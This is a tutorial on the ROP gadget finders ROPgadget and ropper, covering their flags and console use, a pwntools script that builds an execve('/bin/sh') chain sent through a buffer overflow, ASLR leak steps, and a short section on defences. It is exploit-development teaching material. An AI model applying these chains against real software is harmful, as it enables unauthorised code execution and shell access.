# ROPgadget / ropper — full tutorial

`ROPgadget` and `ropper` find gadgets — short instruction sequences ending in `ret` (or `jmp/call <reg>`) — usable as building blocks for ROP / JOP chains. Both index a binary or library and let you search by mnemonic.

## Install

```terminal
pip install ROPgadget ropper
```

## ROPgadget — basics

```terminal
ROPgadget --binary ./vuln
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --depth 6 > libc-gadgets.txt

# Search by string
ROPgadget --binary ./vuln --re "pop rdi"
ROPgadget --binary ./vuln --string "/bin/sh"

# Auto-build a chain
ROPgadget --binary ./vuln --ropchain --badbytes "0a"
```

| Flag | Purpose |
|------|---------|
| `--binary <file>` | Target |
| `--depth <n>` | Max instructions per gadget |
| `--re <regex>` | Filter by regex |
| `--string <s>` | Find string addresses |
| `--opcode <hex>` | Find specific bytes |
| `--ropchain` | Try to auto-generate `execve("/bin/sh")` chain |
| `--badbytes "0a 00"` | Forbidden bytes in gadget addresses |
| `--multibr` | Include `jmp/call`-ending gadgets (JOP) |
| `--all` | Include duplicates |
| `--filter "pop|leave|ret"` | Filter mnemonics |
| `--memstr "/bin/sh"` | Search inside readable sections |
| `--no-jop` / `--no-sys` | Exclude JOP / syscall gadgets |

## ropper — alternative & richer

```terminal
ropper --file ./vuln --search "pop rdi; ret"
ropper --file libc.so.6 --search "syscall;"
ropper --file ./vuln --jmp esp
ropper --file ./vuln --type rop --quality 1
ropper --file ./vuln --string "/bin/sh"
ropper --file ./vuln --chain "execve cmd=/bin/sh"
```

Strengths over ROPgadget:

- Better Mach-O / PE support.
- Quality ranking (shorter / cleaner gadgets first).
- Sets/architectures across x86 / x64 / ARM / ARM64 / MIPS / PPC / SPARC.
- Console mode: `ropper` then interactive `:`.

```
$ ropper
(ropper)> file ./vuln
[INFO] Load gadgets from cache
(libc-2.31.so/PE/x86_64) > search /pop rdi/
0x000000000026b72: pop rdi; ret;
0x000000000142302: pop rdi; pop rbp; ret;
(...)
```

## Workflow — building a ROP chain (x86_64 Linux)

Goal: `execve("/bin/sh", 0, 0)`.

System V calling convention: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`.

```python
from pwn import *

e = ELF('./vuln')
libc = e.libc                           # auto-detect mapped libc

# Find gadgets via pwntools.ROP (uses ROPper / ROPgadget under the hood)
rop = ROP([e, libc])
rop.raw(rop.find_gadget(['ret']))       # stack alignment
rop.execve(next(libc.search(b'/bin/sh')), 0, 0)
print(rop.dump())

payload = b'A'*72 + rop.chain()
io.sendline(payload)
io.interactive()
```

`pwntools.ROP` reads gadgets from the binaries you give it; the `.execve()` builder figures out the right gadgets to load `rdi`, `rsi`, `rdx`, `rax=0x3b`, then `syscall`.

## Manual chain

```
[ pop rdi; ret      ]  ← addr0
[ /bin/sh address   ]
[ pop rsi; ret      ]
[ 0                 ]
[ pop rdx; ret      ]
[ 0                 ]
[ pop rax; ret      ]
[ 0x3b              ]
[ syscall; ret      ]
```

Stack-walking from the corrupted return address: each gadget's `ret` pops the next gadget address. Easy to debug with `gdb` + `pwndbg` — `stack 30` prints the layout.

## ASLR / PIE notes

- **NoPIE binaries** — gadgets at fixed addresses, you can hardcode.
- **PIE binaries** — need a leak first; gadgets relative to the binary base.
- **ASLR libc** — leak a libc address (e.g., printf GOT) → compute libc base → use `libc-database` to find the version → use libc gadgets.

```terminal
libc-database/find printf 0xf7e89870
# returns matching libc(s); use that .so for offsets
```

## Bad output / fixes

| Symptom | Fix |
|---------|-----|
| `--ropchain` says "no chain found" | Binary too thin; use libc gadgets too |
| Gadgets show `bad characters in address` | Switch to `--badbytes`; choose alternates |
| Cache stale | Some tools cache; clear `~/.ropper/` cache |
| Wrong arch | `--arch x86_64`; verify `file ./vuln` |
| ARM/Thumb gadgets needed | `ropper --arch ARMTHUMB` |

## Defender perspective

ROP / JOP exploitation requires gadgets. Defenses:

- **CET / shadow stack** — Intel/AMD HW shadow-stack invalidates ROP.
- **CFI** (Control-Flow Integrity) — Clang/LLVM `-fsanitize=cfi`.
- **PIE + full ASLR** — leaks become required.
- **Stripped binaries** — reduces gadget surface (modestly).
- **Compiler flags** — `-Wl,-z,now`, `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`.

## Related tools

| Tool | Niche |
|------|-------|
| **pwntools.ROP** | Higher-level chain builder |
| **angrop** | Programmatic ROP via angr's symbolic engine |
| **one_gadget** | Find single-call libc shells |
| **xrop** | ARM-specialized |
| **gef / pwndbg** | Live ROP visualization in gdb |
